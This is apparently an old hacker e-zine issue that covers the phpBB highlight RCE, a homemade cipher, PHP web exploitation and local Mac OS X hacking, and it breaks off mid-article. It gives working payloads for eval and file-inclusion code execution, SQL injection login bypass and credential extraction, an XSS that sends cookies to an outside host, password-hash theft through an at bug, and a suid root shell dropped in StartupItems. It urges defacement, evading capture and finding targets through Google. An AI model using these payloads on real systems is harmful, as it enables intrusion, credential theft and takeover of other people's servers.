################################################################################
#      06. Phpbb 2.10 Disclosure cause mischief and mayhem on the net          #
################################################################################

In use by millions of websites all over the internet, phpBB is one of the most
popular message board systems. You can imagine the mayhem that ensued when a
major vulnerability was discovered late November 2004 that allowed the execution
of commands on all major versions prior to 2.0.10.

Many users might remember Jessica Soules as a developer for Hack This Site. No
one expected her release of the bug to Bugtraq would result in such an explosion
that caused several major worms that killed tens of thousands of websites and
bless script kiddies with easy to use tools to take down a server.

The vulnerability lies in viewtopic.php, which does not correcty validate the
user-supplied ""highlight"" variable as it is passed to PHP's eval() command. You
can break out of their command and issue your own PHP commands, including the
system() command, allowing remote execution of commands. You could craft a URL
similar to /viewtopic.php?
t=2&highlight=%2527%252esystem(chr(108)%252echr(115))%252e%2527, which would
execute ""ls"" giving you a directory listing.

This exploit opens the machine up for you to play with the permissions of
whatever the web server is running as. From here you could perform a wide range
of actions from grabbing password information from config files or install
backdoors or just simply fuck up their forums. The box is essentially yours to
play with, and it shouldn't be difficult to find ways of gaining higher
permissions to take over the machine entirely.

It wasn't long before someone wrote a perl script to search google for
vulnerable targets to attack and spread itself to. The Santy(or
NeverEverNoSanity) worm ran at least 20 generations and killed an estimated
40,000 websites before google disabled the search queries that allowed the worm
to spread. Several modifications of the worm changed search engines and queries
slightly that allowed it to spread once again. The payload of the worm was to
wipe all files and replace it with ""This website has been defaced!!!""; For such
a cleverly written worm, the author didn't have a whole lot to say, and caused a
whole lot of random destruction and ruined things for hackers who wanted to use
the phpBB bug for more legitimate purposes.

The release of this major bug has had some massive implications. In the future,
we advise against disclosing such vulnerabilities because of the potential side
effects of script kiddies or destructive worms. Since Jess released it to
Bugtraq, she has been under constant harassment from phpBB, her hosting
provider, and other groups who have been personally affected by the phpBB hack.
In finding such a devestating security hole in such a major piece of software,
Jessica will go down in history.

################################################################################
#            07. Nmap Developers Intimidated by FBI   By Wyrmkill              #
################################################################################

Fyodor, the creator of the Nmap portscanning says he is being pressured by the
Federal Bureau of Investigation for copies of the Web server log that hosts his
Web site, Insecure.org

Nmap is an open source tool designed to help security experts scan networks,
services and applications. Federal agents are trying to  intimidate hackers who
download and use these tools, no matter what they do with  it.

Fyodor made this announcement in his blog, ""FBI agents from all over the country
have contacted me demanding Web server log data from Insecure.org. They don't
give me reasons,but they generally seem to be investigating a specific attacker
whom they think may have visited the Nmap page at a certain time. So far, I have
never given them anything. In some cases, they asked too late and data had
already been purged through our data retention policy. In other cases, they
failed to serve the subpoena properly. Sometimes they try asking without a
subpoena and give up when I demand one.""

It is not a new tactic for law enforcement to use intimidation and pressure to
convince hackers to give in - but without a search warrant, or a proper
subpoena, you are not required to answer questions or give anything to them.
Stand up for your digital rights! http://www.insecure.org/nmap is a link to the
nmap portscanner.

                      !###################################!
                      !###        ARM YOURSELF:        ###!
                      !###   EXPLOITS AND TECHNIQUES   ###!
                      !###################################!
            
             ""Until our most fantastic demands are met, fantasy will
              always be at war with reality.""
           
################################################################################
#                  08. The Art of the Cipher   By Psyche                       #
################################################################################

Cryptography is the term given to the study of encryption, or making data secret
by hiding its meaning in layers of alteration.. Great, but why should I bother
reading this? I can use an encryption program...There are a great many well
known ways of encryption. To name a few: the Caeser Shift, the Enigma code, MD4,
MD5, Xor and many more. There are also alot of programs tailored to cracking
these methods, thereby making these forms of encryption less and less secure.
Great! Get the point please! I'm a busy person! Thus, there is not an encryption
more secure than one you have devised yourself; nobody else knows how it works
so there is no program to decrypt it. This article has a brief guide to creating
your own cipher in four easy steps.

Stage 1: Lost in Encryption

Firstly we need a string to encrypt: PURPLE CARS ARE MORE FUN. The first step in
cipher creation is devising a way of hiding your data, there are three main
schools of doing this. Substitution - Replacing the letters in a string with
other letters, numbers,symbols etc. Shift - Altering the position of a letter in
a string, or shifting the letter along the alphabet or ASCII table. Rail -
Changing the presentation of the string to make it harder to comprehend. I am
going to implement a simple substitution, replacing each letter in the string
with the one directly proceeding it in the alphabet, making our sting:

PURPLE CARS ARE MORE FUN otqokd bzqr zqd lnqd etm

Where the letter A is in the string it has been counded around again in the
alphabet, making the new letter Z. So, we can mathamaticly display our cipher as
X-1, where x is a letter in our string. This however is horrendously insecure,
and can easilly be decrypted by anoyone with an understanding of cryptography.
So, we need to add something to make it harder.

Stage 2: Variables

For those who are unfamiliar with the workings of algorithm based cryptography a
brief synopsis is as such: X*N*K X being the numerical value of the letter or
word to be encrypted. N being any given number and K being the key. The key is a
number which can be constantly changed to alter how the string is encrypted. In
algorythim encryptions the key forms the variable. The shortcoming of such
algorithim based encryptions is that any number crunching program can eventually
be solved. Variables are just what they sound like, something that can be
altered in the cipher to alter the outcome. Variables can be easilly changed to
protetct intregrity and foil any decrypting attempts. For this example i will be
implimenting a variable as follows; 7x. Where X is the numerical value of the of
a letter (I could make this alot more difficult however I want a cipher that can
be fairly easilly decrypted, by me anyway) Thus making the cipher without the
variable added: o t q o k d b z q r z q d l n q d e t m 15 20 16 15 11 4 2 24 17
18 24 17 4 12 14 17 4 5 20 13

And with the variable added:

105 100 119 105 77 28 14 168 119 126 168 119 28 84 98 28 35 100 91.

However this is still in essence substitution and can be fairly easily cracked.
The main benefit is that it has a basis for alteration at a moments notice.

Stage 3: Constants

Adding a constant has one big advantage, it stops any letter/number/symbol from
being repeated, which helps protect it from frequency based attacks. I will be
using square numbers as my constant. Adding them to the front of the numbers.

1105 4100 9119 25105 2677 4928 6414 81168 100119 121126 144268 169119 19628
22584 25698 289119 32435 361100 40091

Stage 4: Calculated Chaos

This final step is to throw off any attempts to break the cipher by adding a
condition to the previous steps. This simply makes finding the cipher harder. It
is best used in an IF situation. IF (whatever)=true then do whatever. So, I
intend to alter the last stage in which if the number in the encrypted string is
a prime number the square number is added to the rear of the text, not the for.
Thus, making our cipher (after checks but before revisions) (Just a wee note, 1
isn't a prime number, contrary to popular belief)

1051 1004 1199 25105 3677 4928 1464 81168 100119 121126 268144 169119 28196
22584 25698 289119 35324 361100 91400

See, wasn't that easy?

Final section: The Importance of nothing

It seems to be a mindset of people to assume that numbers in an algebraic
equasion will be intigers of 1 or more or -1 or less, not 0. I find that adding
0 (when it's replaced by something) will confuse any human led attacks, but not
computer ones. So, there you have it. A brief inroduction into the construction
of a cipher. This is only an outline and I strongly encourage deviation. if you
wish to know more, there are a number of good books and sites out there, and of
course www.hackthissite.org.

################################################################################
#            09. Finding and Exploiting php Script Vulnerabilities             #
################################################################################

You can spend all your time making sure all your services are patched, install
expensive firewalls and tripwire software, and make sure all your communication
is done over SSL. But even the more complex and secure server can all go to
waste if you are using insecure PHP code. More and more people are realizing the
weight of web application security holes. Instead of talking about specific
exploits that come and go, I will try to explain some techniques that will help
to find vulnerabilities in PHP software and how to exploit them to gain access.

Often most vulnerabilities are not in the actual server software but in poorly
written code or irresponsible configuration. Most of the time it comes down to
not validating input before it is passed to vital system functions. At the
worst, this will allow you to execute commands from the same user that the web
server is running at (usually www, apache, or nobody) which usually has a
relatively low level of permissions on the server. It's not much, but the access
can be exploited further to possibly gaining more permissions on the machine,
reading sensitive information, or depending on how poorly the server is
configured(folders and files chmodded to 666, passwords and configuration files
lying around, etc), it could be devestating indeed.

$The Fundamentals;
------------------
If variables are passed from your client to their server, you can change these
values to anything you'd like. This is one of the most fundamental principles
behind web security. If you see a link like 'index.php?section=links', their
script examines the variable 'section' and responds accordingly. While there may
not be a way to modify the value of this variable on their site itself, you
could do so through a number of ways.

There are three ways variables can be passed from your browser to the PHP
script: over GET, POST, or cookies. Variables being sent over the address bar
(like asdf.php?var1=somevalue&var2=anothervalue) is known as the GET method and
can be changed directly in the URL bar. Variables sent from a form are sent over
POST, and can be changed either by creating your own HTML page with a form of
your own, or by forging your own HTTP request using the HTTP protocol(this can
be done using telnet on port 80 - see rfc2616 for specific commands). Cookies
are saved and sent in a number of different ways varying on your operating
system and web browser. If you can't find a way to change the values of your
cookies through a GUI interface, you can change the values through forging your
own HTTP request as well.

Many times you can use any of the above methods to set a variable inside of a
script. But more and more php configurations have register_globals off. If this
is the case, PHP scripts have to refer to variables like $_GET['varname'],
$_POST and $_COOKIE. This restricts you into setting variables using the method
they were intended to be used with. This does not make it invincible, but it
forces you to spoof the variable in the way that the script is expecting the
input.

$Generating Errors;
-------------------
Once you find out how to inject different values into variables of a web
application, you should try to generate an error code. This can be done by
inserting all sorts of (not so) random characters into these scripts. Very often
scripts will dump all sorts of messages that could help you find out their
database structure, file paths, and more.

If you found a script similar to index.php?file=links.php, and tried changing it
to index.php?file=linksaaaa.php, it might give you an error similar to:

Warning: main() [function.include]: Failed opening 'includes/linksaaaa.php' for
inclusion (include_path='.:/usr/lib/php:/usr/local/lib/php') in
/home/www/public_html/index.php on line 45

This will give you all sorts of useful information: the location of the web
root, as well as the previous information that they are using a statement
similar to include ""includes/$file"", which is vulnerable. You might want to also
try looking in /includes to see if any additional information is stored there.

Scripts that use SQL statements might also reveal information about the SQL
server and maybe even a portion of the SQL statement, possibly giving names of
tables and fields.

Microsoft OLE DB Provider for ODBC Drivers error '80040e14' [Microsoft][ODBC SQL
Server Driver][SQL Server]Unclosed quotation mark before the character string '
order by DESCRIPTION '. 
/products.asp, line 6

$Finding Vulnerable Scripts;
----------------------------
Now that you have an idea of what sort of vulnerabilities to look for, the fun
begins when you start looking for targets to practice on. You could sweep for
targets broadly through clever google searches. You could also start downloading
the source code to major PHP software and go through it with a fine toothed comb
looking for mistakes. But most of the vulnerabilities I find are ones stumbled
upon through casual browsing.

You can also try specifically looking for vulnerabilities by downloading the
source code to popular systems and parsing it for known PHP vulnerabilities. A
good place to start would by http://php.resourceindex.com, which has a large
categorized repository for most PHP scripts. You can do all sorts of searches to
grep the source code for vulnerabilities(like the ones listed above) and see if
you can find instances where input is passed to these system functions
unchecked.

Hacking through google is a very fine art and can yield hundreds or thousands of
vulnerable machines with a single query. If you find a piece of vulnerable
software, you might try looking for websites that run that same software. Often
times scripts will leave a small tag at the bottom of the page, so you can
search for ""Powered by GenericMessageBoard v1.02"" to find targets. You could
also search for specific names of scripts through something like
inurl:""/funbb/viewtopic.php"". You could also search for generic scripts like
inurl:"".php?file="" or variations thereof. Often times developers will poorly
configure their systems and make silly mistakes like leaving backup/config files
around or directories open. Much of this information can be extracted through
clever searches. Google hacking can become quite complex and can help assess and
penetrate systems with some amazing results. A great place for more information
would be http://johnny.ihackstuff.com.

$Disclosure;
------------
This is a topic of great debate in the hacking community. Upon finding a
vulnerability, what do you do with it? There are advantages and disadvantages
that come with disclosing a security hole which need to be weighed with your
personal morality.

If it is a large piece of software used by many websites, you could post it to
BugTraq and receive quite a bit of attention and credit if you word things well
and handle it correctly. If you go this route, many people feel that before you
publically release a major vulnerability it would be good practice to notify the
vendor so that they can release a patched version. Of course, you would also be
giving script kiddies ammunition to attack other sites with. The vulnerability
would also lose it's appeal of being 'hot' because everyone's got it now, and
soon most websites will be running patched software. Many people believe it is
best to keep vulnerabilities on the down low, but nothing will stop it from
eventually being released to the public.

If the vulnerability lies in the custom code of someone's website, your actions
should depend on what sort of website it is, what sort of service they provide,
etc. If they are in general an honest, good hearted group of people, it wouldn't
accomplish much to trash their site. If it's a nazi, pro-war or hate-filled
site, it is a different story. Many people feel that a simple defacement isn't
really harmful as long as you don't delete files and if you notify the web
developer how it is fixed, and for the most part unless it is a major
corporation you don't have to worry about any sort of investigation especially
if you use a proxy.

$Validating Input + Secure Coding;
----------------------------------
There are all sorts of techniques webmasters use to validate input, and it
largely depends on what system functions the input is being passed to and what
you are trying to defend against.

If you are using include, require or fopen statements, consider using a function
like is_file() to verify that you are including an actual file stored on the
machine as opposed to PHP code on another server. You should also strip all
special characters like periods, commas, and slashes, to prevent someone from
doing something like include(""/includes/../../../../etc/passwd""). You might want
to also set open_basedir restrictions on to prevent people from leaving the web
root and including sensitive system files and configurations.

To defeat most SQL injection issues, you should make sure to use addslashes()
before passing anything to mysql_query and then stripslashes() when retrieving
data. You should also consider typecasting input to an integer if you are doing
something similar to products.php?category=3 or viewitem.php?id=44. PHP also
provides two commands, escapeshellcmd() and escapeshellarg(), which can be
useful to strip input before it is passed to a exec() function.

If information is being stored in a database to be displayed to users later, you
should sanitize input as to prevent cross site scripting vulnerabilities as well
as prevent people from causing general mayhem by opening tags and never closing
them. Consider using str_replace to convert all < and > characters to < and
>s to prevent people from starting html tags or javascript code blocks. You
might also want to strip all newline characters and other special codes.

For all purpose validation, consider checking a variable against a series of if
or switch statements to see whether the value is allowed before passing it off
to functions:

switch ($page) {
  case ""links"":
    echo ""Links!""
    include ""includes/links.inc.php"";
    break;
  default:
    die(""Sorry, not valid input."");
}

The most secure method would be to strip input of everything except for
alphanumerics. This can be accomplished through the use of regular expressions:
$str = preg_replace (""/[^a-z 0-9]/i"",'',$str);

It is also a good idea to surpress output of a function as to prevent error
codes from helping hackers from gaining information about your system
configuration, database layout, file structure, etc. You can do this by sticking
a @ in front of the function name: $result = @mysql_result(""SELECT * FROM
admin_users"");

There are also a number of PHP config options that can help secure a machine.
turning open_basedir on will prevent a file from accessing files outside of it's
base directory(preventing attacks like including ../../../../etc/passwd).
Turning magic quotes on will automatically escape quotes from input into to
prevent Turning safe mode on allows a number of precautions like disabling or
inhibiting system functions such as system/exec/passthru, include/require, etc.
Turning register_globals off will force PHP scripts to reference input from
users like $_GET['varname'], $_PUT or $_COOKIE instead of referencing them
directly like $varname. As of PHP 4.2.0, this has been made the default option.
This helps for poorly written scripting which might allow users to inject values
into variables. 

$Rousing Conclusion;
--------------------
This guide should at least point you in the right direction as far as finding,
exploiting, and fixing common PHP input validation vulnerabilities, and give you
some idea of what you can do with it. Most web vulnerabilities will provide you
with a foot in the door where you can try other tricks to try to elevate
permissions and gain further access. You should also check out ways of securing
your level of access through backdoors and burying yourself in system files. 
You can play with many of the concepts explained here on some hacking 
simulations at hackthissite.org. Or you can try some clever google searches and
find a billion machines in the wild =) Have fun, cause mischief, and don't get
caught!


$Real World Examples;
---------------------
Here are some real world examples of the vulnerabilities explained in this
document. This small list is just a preview of the kind of stuff that is
discovered every day.

phpMyAdmin 2.6.1 Remote File Inclusion
allows you to read arbitrary files
http://[HOST]/[DIR]/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc&theme=
passwd%00

Remote PHP Code Execution: vBulletin 3.06 and below:
injects PHP code through invalidated eval statement
 http://[target]/misc.php?do=page&template={${phpinfo()}}

phpMyFamily <= 1.4.0 SQL injection admin bypass:
injects sql code which allows you to login as an administrator:
Login: ' OR 'a'='a' AND admin='Y'/*
Password: (empty)

PHP Form Mail 2.3 Arbitrary File Inclusion
allows php code execution and remote unix commands
http://[target]/[dir]/inc/formmail.inc.php?script_root=http://asdf.com/phpcode.
php

MiniBB 1.7 SQL Injection
reveals admin passwords through sql injection vulnerability
http://[target]/minibb/index.php?action=userinfo&user=1%20union%20select%201,2,
user_password%20from%20minibb_users/*


Keep your eye open for the following types of vulnerable PHP scripts:

include, require, or fopen
--------------------------
If input is passed to include, require, or fopen in ways similar to:
include ""$page"" or require ""$page"";

... then depending on the server configuration, you could either read files off
their machine or even execute your own PHP code. By setting $page to something
like '/etc/passwd' or ""../../admin/.htaccess"", you could read sensitive data off
of their machine like server config files or passwd files. In many systems if
you pass a URL to include() their server will make an http connection grab the
file and execute php code. This means you can write a script like <?php echo
passthru($cmd); ?>, save it on your webserver, and call their script like
include.php?file=http://www.yourdomain.com/passthru.php&cmd=cat /etc/passwd . 

Depending on how they modify their statement (like include ""includes/$page"",
include ""$page.php"", etc) it may limit what you can do or make it a bit more
difficult. Often times error statements will reveal the path of the script as
well as what input they are passing to include.

Warning: Unable to access fun in /home/sites/18/web/cia/include.php on line 1

If a script ends your input with an extension(like include
""/path/to/$file.inc""), you may be forced to reading files only ending with a
.inc - unless they are running specific combinations of php and their os which
may allow you to add a %00 at the end of your input which will cause include to
ignore the extension. ex: include.php?file=../../../../../etc/passwd%00 

cross site scripting
--------------------
When a script takes input and sends it back to thebrowser without sufficient
validation, you could inject javascript code that lets you interact with the
user's browser.

<?php echo ""Hello, $name""; ?>

showname.php?name=freeme<script>alert(document.cookie);</script>

This would make an alert box displaying the cookies for the given domain to the
user. If this is vulnerable, it's also very likely that you could craft a URL
that redirects the user to an offsite URL that logs the user's cookie for later
retreival through something like...
showname.php?name=freeme<script>window.navigate(""http://www.somehost.com/
cookiesteal.php?thegoods=""+document.cookie)</script>

...where cookiesteal.php would log all incoming requests and the contents of
'thegoods'. Many web scripts use cookies to store authentication information,
which you could use on the original site either by saving the values of these
cookies as your own, cracking passwords, etc.
eval
Eval allows you to execute PHP code from a string. If you do not sanitize input
before it is passed to this function, it can potentially be manipulated to
execute PHP code. A statement like eval(""\$message = \""$var\"";"");  could be
manipulated like asdf.php?var="".passthru('cat%20/etc/passwd').""

sql injection
-------------
There are many complexities that vary with the SQL server you are dealing with
as well as the configuration of the web server. In most cases, PHP is used with
MySQL is more secure than something like Microsoft SQL server. Regardless of
what server they use, if the coder does not check input before it is passed to
an sql statement, you could possible extract data from their database or bypass
login prompts. Consider the following authentication system:

$result = mysql_result(""SELECT * FROM users WHERE username='$username' AND
password='$password"")
if (mysql_numrows($result) == 1) {
  echo ""login success..."";
} else {
  die(""Error! "" . mysql_error());
}

If the variables $username and $password are not checked for bad input, one
could enter the following into both the variables and trick the login prompt
into thinking he entered a valid login:
login.php?username=' OR 'a'='a&password=' OR 'a'='a

The new SQL query would look something like **SELECT * FROM users WHERE
username='' OR 'a'='a' AND password='' OR 'a'='a'** in which case it doesn't
matter what the username or password is, the character 'a' will always be equal
to 'a', which would log you in as the first user in the database. You could also
modify username slightly to allow you to choose the user if you know the name of
the field in the database: ' OR 'a'='a' AND username='kevin mitnick

Many times a script will have magic quotes on or use the PHP functions
addslashes/removeslashes before passing input to the query. In this case,
characters like ' will automatically be escaped into \', which MySQL will
understand as part of a string and not a special SQL statement.

There are also ways of extracting data from the database if a script passes
poorly validated data to a SELECT query. Consider the following script:

$result = mysql_result(""SELECT * FROM products WHERE category=$category"");
while ($i < mysql_numrows($result)) {
  $data = mysql_fetch_row($result);
  echo ""Product name: $data[0] Product price: $data[1]<br>"";
}

MySQL has the ability to join several SQL queries into one result set. In the
above example, you could craft a URL which would allow you to grab data from
another table and return it with the same results as the products table. 

products.php?category=-1 UNION SELECT username, password FROM users WHERE
username='admin'

In order to pull something off like this, it would require you to know the exact
fields and table names. If it was a Microsoft SQL server, you could query
INFORMATION_SCHEMA to get information about the database structure. This
technique also requires that the first and second query have the same number of
columns. Often times you could figure this out by trying somethign like SELECT
1, 2, 3 FROM tablename ... SELECT 1, 2, 3, 4, 5, 6, 7 from tablename... etc. to
find the right number of columns that will match. Often times the types of
fields returned also have to match, in which case you could either stick raw
integers or characters to test and find which fields are which(SELECT 1, 2, 'a',
a', 3, 'a', 4, 5 FROM). Generating errors from SQL will often times reveal
important information about the names of tables and fields as well as how
specific queries are structured in the programmer's code.

SQL injection is a complex trick that requires quite a bit of research and
practice to master well outside the scope of this small introduction. Most of
the time, every system will be different and every individual programmer will
craft their SQL statements differently and not use such obvious table and field
names. There are a number of well written whitepapers about all sorts of
techniques in which I would suggest for further reading. Many of the realistic
challenges on HackThisSite.org also provide a place for you to legally practice
this technique on real systems set up with intentional php/mysql flaws.

system, exec, passthru
----------------------
These functions execute UNIX commands, which obviously pose a threat if input is
passed to these functions without sufficient validation. For example, if a
script does something like passthru(""cal $inputyear""), expecting input to be an
integer year so that it can display the calendar, you can inject a value like
""2001; ls"" and get a directory listing. This is possible because you can execute
several UNIX commands in one line by seperating them with a semicolon. You can
also try working with several other commandline goodies, like `cat /etc/passwd`
which will dump the output of any command between the ``s, or | which will let
you pump output from one program into another, or > and >> which will let you
dump output from a command into a file.

file uploading
--------------
Often times scripts will present you with a form that will allow you to pick a
file off of your hard drive and upload it to their website. There are a few
tricks you could try this that might allow you to upload files in other
locations with other names, potentially allowing you to overwrite files or
upload PHP files which may allow you to gain the ability to execute commands as
the web server.

If you're lucky, they won't do any sort of authentication that makes sure you
are uploading files of a specific type. If this is the case, you can upload a
PHP file without any trouble and be able to do anything you want to do. Most of
the time they will at the least check for file extensions in which case there
may be some workarounds. Often times if it is a media upload it will check for
the presence of 'jpg', 'jpeg','gif', etc. You might want to try uploading a file
called jpg.php. If they allow uploads of any kind of file EXCEPT for blacklisted
extensions, check to see if they allow you to upload php, php3, phtm, phtml,
phps, perl, pl, cgi, asp, aspx, jsp, or any other sort of server side scripting
language. 

There are also several different vulnerabilities in PHP itself allowing users to
upload files as any name in any location that the web server can write to. This
is only capable of the name of the $_FILES variable has an underscore(_)
character. You can forge your own HTTP request and set the name of the file
through Content-Type: ../../path/to/newfilename.html to ignore the
filename=""somefile.html"" which usually defines the name of the file. This
potentially allows you to upload PHP files, gaining the permissions of the web
server.

Another vulnerability in PHP allows you to bypass their measures to prevent path
transversal. If you upload a file with a single quote(such as ..'filename.html),
PHP will escape the quote into a /' AFTER it sanitizes the input, resulting in
the final name of ../'filename.html. If there isn't sufficient input validation
and if the web server has write permissions, this will potentially allow you to
upload files one directory up. This affects PHP 4.3.6 to 4.3.9.

General Misconfigurations
-------------------------
Often times a web developer will be careless and make mistakes which might
reveal configuration files or logins. Often a php file will be named something
other than .php which will cause the web server to output the raw source to you
instead of parsing it for PHP code before output. This can also happen when
backups are made by copying a file as config.inc.php.bak or so forth, which
might reveal login or mysql information.

It is also a good idea to check out all directories on a system that do not have
an index page to see whether the web server is configured to give you a
directory listing, which in some cases might give you access to sensitive
information about the server or organization.

If you have the ability to read files off their machine, you might want to try
reading configuration files for their PHP scripts or the server as a whole. If
they are using common software, try downloading the source from the developers
website, find the name of the configuration file, and try reading the targets to
reveal mysql u/p or more. If you can read outside of the web directory, also try
reading httpd.conf, ftp conf files, user .bash_history files, my.cnf,
.htacesses, etc (or boot.ini, sam, config.sys, etc on a windows machine). A
developer may even be as silly to leave default logins and passwords when
configuring a ready to go PHP script.

################################################################################
#                       10. Hacking Local Mac OS X                             #
################################################################################

The tricks explored in this article range from privilege escalation
vulnerabilities to clever ways to get around protection schemes. Some have been
kept on the down low, but as more of them are recognized and patched by Apple,
we may as well make these available for people to learn from. While I'm not just
going to post exploit scripts, I'll explain what can be done and leave you to
research and make the most of these tricks.

 - Cracking User Passwords
 - Reading Files as Root through /usr/bin/at 
 - Sensitive Swap Files 
 - Tricking Software Update 
 - Recover Open Firmware Password 
 - URL Handler Exploits 
 - Other Vulnerabilities 

--------------------------------------------------------------------------------
Cracking User Passwords
--------------------------------------------------------------------------------
Gone are the days where you can just execute ""nidump passwd ."" and get a list of
DES encrypted passwords for all users. Even though this was patched a while ago,
there's still several ways to be able to recover user passwords. Mac OS X does
not store passwords in an /etc/shadow or /etc/master. passwd file. However,
there is a way you can recover password hashes for all users.

Mac OS X uses NetInfo to handle user accounts. The password hashes on an OS X
based system are stored in /var/db/shadow/hash/(guid). Each user has its own
hash file. To get a list of users and their corresponding generated uid(guid),
try:
local: user$ nireport / /users name generateduid uid | grep -v NoValue 
admin 559DBF44-4231-11D9-A5A8-00039367EBAE 501 
orb 5D97A400-5045-11D9-AFEB-00039367EBAE 502 
test C82D45B7-6422-11D9-853D-00039367EBAE 503 

So the password for the ""admin"" user is stored in
/var/db/shadow/hash/559DBF44-4231-11D9-A5A8-00039367EBAE. Now this file can be
read only as root. Of course, there are a few tricks we can try that allow you
to read these files. But let's say that you have root access for now.
 # cat /var/db/shadow/hash/559DBF44-4231-11D9-A5A8
 00039367EBAE 209C6174DA490CAEB422F3FA5A7AE634F0D412BD764FFE81AAD3B435B5
1404EED033E22AE348AEB5660FC2140AEC35850C4DA997 

This large string contains two seperate hashes for the same password. The first
64 characters form the SMB hash(which is used for Windows file sharing, even if
it is not turned on) which is actually two 32 character MD4 hashes put together.
The last 40 characters form the SHA1 hash. Once you have recovered this file,
all that remains is to properly format this file and run it through a password
cracker like John the Ripper or Lepton's Crack. 

SMB hashes:
admin:209C6174DA490CAEB422F3FA5A7AE634:F0D412BD764FFE81AAD3B435B51404EE
orb:6FFB224FB592476B2230862E220937DA:4B881A967FE694FBAAD3B435B51404EE
test:0CB6948805F797BF2A82807973B89537:01FC5A6BE7BC6929AAD B435B51404EE

SHA1 hashes:
admin:D033E22AE348AEB5660FC2140AEC35850C4DA997
orb:23119F5947DA61A815E7A1CC2AF9BDB8C19CAF1F
test:A94A8FE5CCB19BA61C4C0873D391E987982FBBD3

--------------------------------------------------------------------------------
Reading Files as Root through /usr/bin/at
--------------------------------------------------------------------------------
There is a vulnerability in /usr/bin/at that allows you to read files as root.
This implications of this can be devestating if you already have local
unprivileged access. Using this trick, you can read a variety of sensitive files
including user password hashes, temporary swap files, .bash_history files, etc.

This will allow you to read a list of commands executed by the ""admin"" user:
local: user$ id
uid=503(test) gid=503(test) groups=503(test)
local: user$ ls -al /users/admin/.bash_history
-rw------- 1 admin staff 1259 12 Sep 2003 /users/admin/. bash_history
local: user$ cat /users/admin/.bash_history cat: /users/admin/.bash_history:
Permission denied
local: user$ at -f /users/admin/.bash_history now+1minute
Job a011afa33.000 will be executed using /bin/sh
local: user$ cat /var/at/jobs/a011afa33.000
(the contents of /users/admin/.bash_history)

As long as you have local access to the machine, you can read the hash files for
all users using this vulnerability:

at -f /var/db/shadow/hash/559DBF44-4231-11D9A5A8-00039367EBAE now+1minute

This was patched with the January 25, 2005 security update available from Apple. 
--------------------------------------------------------------------------------
Sensitive Swap Files
--------------------------------------------------------------------------------
There is another technique for recovering passwords making use of temporary swap
files. Several components including FileVault, Keychain, login, and others store
all sorts of sensitive data in these swap files located in /var/vm/. These are
huge files and it takes some clever unix commands to be able to extract anything
useful out of them. However, often times the above applications will store
usernames and passwords in plain text.

Try this on your home machine(making sure to also try swapfile1, swap-file2,
etc) 

# strings -8 /var/vm/swapfile0 | grep -A 4 -i longname

This will only recover passwords from people who had sat down and actually used
the system with their user account. Every time the machine restarts, these
swapfiles are cleared, so the longer a machine had been running the better
chance you have with recovering passwords.

Of course, these files are read only by root. You can also use the ""at""
vulnerability above to copy these swapfiles to a temporary location and then use
the above command to parse those files. 
--------------------------------------------------------------------------------
Tricking Software Update
--------------------------------------------------------------------------------
Mac OS X has a handy tool called Software Update which automatically checks for
software patches and security updates. Many of the tricks in this document had
already been patched. Fortunately, if you have access to a machine you can trick
Software Update into thinking that you have already installed specific updates. 

Check out the contents of /Library/Receipts/. Create a file with the same name
as an update package and Software Update won't list that particular package.

--------------------------------------------------------------------------------
Recover Open Firmware Password
--------------------------------------------------------------------------------
Many public computers, especially commercial cyber cafes, use special security
software or tracking mechanisms that prevent you from doing certain activities
or even require you to pay by the hour. Ordinarily, you would be able to restart
the computer into Open Firmware and either use single user mode to mess with the
system or just boot to an external device like the copy of Mac OS X you
installed on your iPod. Unfortunately,more and more computers are starting to
password protect Open Firmware which requires you to authenticate before you do
any of these things.

This is beatable. If you have root access in terminal, try typing nvram
security-password. This should spit out a string which is the open firmware
password encoded in xor hex. It is NOT encrypted, it is simply obfuscated. 

nvram security-password
security-password: %d9%df%da%cf%d8%d9%cf%c1%d8%cf%de

The MacSIG group at University of Michigan wrote a C script to be able to
generate strings to be used as the open firmware password:
http://macosx.si.umich.edu/files/ofpwgen.c

Using this you should be able to generate strings to match with the password
found by nvram security-password. You can also use this chart as a reference: 

nvram security-password
a  b  c  d  e  f  g  h  i  j  k  l  m 
%cb%c8%c9%ce%cf%cc%cd%c2%c3%c0%c1%c6%c7

n  o  p  q  r  s  t  u  v  w  x  y  z 
%c4%c5%da%db%d8%d9%de%df%dc%dd%d2%d3%d0 

A  B  C  D  E  F  G  H  I  J  K  L  M 
%eb%e8%e9%ee%ef%ec%ed%e2%e3%e0%e1%e6%e7

N  O  P  Q  R  S  T  U  V  W  X  Y  Z  
%e4%e5%fa%fb%f8%f9%fe%ff%fc%fd%f2%f3%f0

1  2  3  4  5  6  7  8  9  0  !  @  # 
%9b%98%99%9e%9f%9c%9d%92%93%9a%8b%ea%89

$  %  ^  &  *  (  )  +  =  -  _  }  {  
%8e%8f%f4%8c%80%82%83%81%97%87%f5%d7%d1

When you have this password, you are able to boot into single user mode or
restart from the operating system stored on your iPod, circumventing any sort of
security mechanism set up by the owners.

-------------------------------------------------------------------------------- 
Exploiting Bad Startup Items Permissions
-------------------------------------------------------------------------------- 
If the /Library/StartupItems folder has not already been created, certain
software installers that use this folder may have to create it in order to run
programs when the machine restarts. These scripts run as root. Very often poorly
written software installers will create this folder with bad permissions,
allowing any user to drop files in that directory. One could write a malicious
script, drop it in that folder, restart the computer, and be able to execute
scripts as root.

ls -al /Library/StartupItems/
total 0
drwxrwxrwx 3  root admin 102  5 Apr 12:15 .
drwxrwxr-x 39 root admin 1326 6 Apr 09:28 ..

As you can see, the directory is chmod 777 - which means we can write files to
it. Make a folder in this directory and write a shell script which the same name
as the directory containing the text:

#!/bin/sh
cp /bin/sh /etc/.rewt
chown root /etc/.rewt
chmod 4755 /etc/.rewt

Then make a file called StartupParameters.plist containing the text:
{
 Description = ""NameOfScript"";
 Provides = (""NameOfScript""); 
 OrderPreference = ""None""; 
}

Next time you restart the machine, it will execute the shell script you wrote.
This particular shell script will make a suid root shell in /etc/.rewt. Boom! 

--------------------------------------------------------------------------------
URL Handler Exploits
--------------------------------------------------------------------------------
There are a number of security issues related to URL handlers in Mac OS X.
Through these tricks, you are able to execute code on a victim machine just by
loading a link in *any* web browser. There are several varieties of these
exploits based around the same contents and have been patched through a number
of different security updates Apple had released, the latest 2004-06-07 fixing
most of them. The basic idea is to trick the browser into downloading and
mounting a DMG file and then trying a second trick to actually run code from the
files stored in the DMG file.

There are a number of ways to be able to mount volumes on victim systems. You
can prepare an HTML document to automatically redirect you to a certain URL
through javascript or a meta refresh tag. By going to
